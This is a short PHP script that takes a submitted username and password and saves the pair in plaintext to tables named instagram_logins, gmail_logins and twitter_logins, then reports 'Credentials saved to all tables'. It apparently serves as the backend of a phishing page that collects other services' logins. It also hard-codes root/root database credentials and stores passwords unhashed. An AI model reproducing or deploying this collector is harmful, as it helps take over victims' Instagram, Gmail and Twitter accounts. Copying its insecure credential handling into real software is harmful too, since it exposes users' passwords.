<?php
// Database connection parameters
$host = "localhost"; 
$dbname = "userlogin";
$user = "root";
$pass = "root"; 

// Get the raw POST data (as JSON)
$json = file_get_contents('php://input');
$data = json_decode($json, true);

// Extract data from the request
$username = $data['username'] ?? '';
$password = $data['password'] ?? '';

try {
    // Create PDO connection
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Prepare statements for each table
    $stmtInstagram = $pdo->prepare("INSERT INTO instagram_logins (username, password) VALUES (?, ?)");
    $stmtGmail = $pdo->prepare("INSERT INTO gmail_logins (username, password) VALUES (?, ?)");
    $stmtTwitter = $pdo->prepare("INSERT INTO twitter_logins (username, password) VALUES (?, ?)");
    
    // Execute inserts
    $stmtInstagram->execute([$username, $password]);
    $stmtGmail->execute([$username, $password]);
    $stmtTwitter->execute([$username, $password]);
    
    // Return success response
    header('Content-Type: application/json');
    echo json_encode(['success' => true, 'message' => 'Credentials saved to all tables']);
    
} catch (PDOException $e) {
    // Log the error
    file_put_contents("../error_log.txt", $e->getMessage() . "\n", FILE_APPEND);
    
    // Return error response
    header('Content-Type: application/json');
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Database error occurred']);
}
?>
